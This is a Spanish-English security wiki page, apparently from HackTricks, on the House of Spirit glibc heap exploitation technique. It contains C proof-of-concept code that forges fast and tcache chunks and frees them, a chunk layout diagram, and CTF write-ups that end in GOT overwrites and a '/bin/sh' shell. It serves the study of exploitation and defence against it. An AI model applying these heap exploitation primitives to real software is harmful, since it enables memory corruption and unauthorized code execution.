# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## Información básica

### Código

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Goal

- Poder agregar en el tcache / fast bin una address para que luego sea posible allocate.

### Requirements

- Este ataque requiere que un atacante pueda crear un par de fake fast chunks indicando correctamente el campo size y luego poder free el primer fake chunk para que pase al bin.
- With **tcache (glibc ≥2.26)** el ataque es incluso más sencillo: solo se necesita un fake chunk (no next-chunk size check is performed on the tcache path) siempre que el fake chunk esté 0x10-aligned y su size field caiga en un tcache bin válido (0x20-0x410 on x64).

### Attack

- Crear fake chunks que bypasses security checks: necesitarás básicamente 2 fake chunks indicando en las posiciones correctas los valores size correctos
- De algún modo consigue free del primer fake chunk para que entre en el fast o tcache bin y luego allocate para sobrescribir esa address

**El código de** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **es genial para entender el ataque.** Aunque este esquema del código lo resume bastante bien:

<details>
<summary>Fake chunk layout</summary>
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
</details>

> [!TIP]
> Tenga en cuenta que es necesario crear el segundo chunk para eludir algunas sanity checks.

### Tcache house of spirit (glibc ≥2.26)

- En la glibc moderna el **tcache fast-path** llama a `tcache_put` antes de validar el tamaño del siguiente chunk/`prev_inuse`, por lo que solo el fake chunk actual tiene que parecer válido.
- Requisitos:
- El fake chunk debe estar **alineado a 16 bytes** y no estar marcado `IS_MMAPPED`/`NON_MAIN_ARENA`.
- El `size` debe pertenecer a una tcache bin e incluir el **bit prev_inuse activado** (`size | 1`).
- La tcache para esa bin no debe estar llena (máx. por defecto 7 entradas).
- Minimal PoC (stack chunk):
```c
unsigned long long fake[6] __attribute__((aligned(0x10)));
// chunk header at fake[0]; usable data starts at fake+2
fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
void *p = &fake[2];          // points inside fake chunk
free(p);                     // goes straight into tcache
void *q = malloc(0x30);      // returns stack address fake+2
```
- **Safe-linking** is not a barrier here: the forward pointer stored in tcache is automatically encoded as `fd = ptr ^ (heap_base >> 12)` during `free`, so the attacker does not need to know the key when using a single fake chunk.
- Esta variante es útil cuando los glibc hooks fueron eliminados (≥2.34) y quieres un fast arbitrary write o solapar un target buffer (p. ej., stack/BSS) con un tcache chunk sin crear corrupciones adicionales.

## Examples

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: Via an overflow it's possible to change a pointer to point to a GOT address in order to leak a libc address via the read action of the CTF
- **House of Spirit**: Abusando de un contador que cuenta el número de "rifles" es posible generar un fake size del primer fake chunk, luego abusando de un "message" es posible falsear el segundo size de un chunk y, finalmente, abusando de un overflow es posible cambiar un puntero que va a ser freed para que nuestro primer fake chunk sea liberado. Luego, podemos allocarlo y dentro de él estará la dirección donde se almacena "message". Entonces es posible hacer que esto apunte a la entrada de `scanf` dentro de la tabla GOT, para sobrescribirla con la dirección de system. La próxima vez que se llame a `scanf`, podemos enviar la entrada `"/bin/sh"` y obtener un shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Uninitialized stack buffer.
- **House of Spirit**: Podemos modificar el primer índice de un arreglo global de punteros al heap. Con una modificación de un solo byte, usamos `free` sobre un fake chunk dentro de un chunk válido, de modo que obtenemos una situación de chunks overlapping tras volver a allocar. Con eso, un simple Tcache poisoning attack funciona para obtener un arbitrary write primitive.

## References

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)

{{#include ../../banners/hacktricks-training.md}}
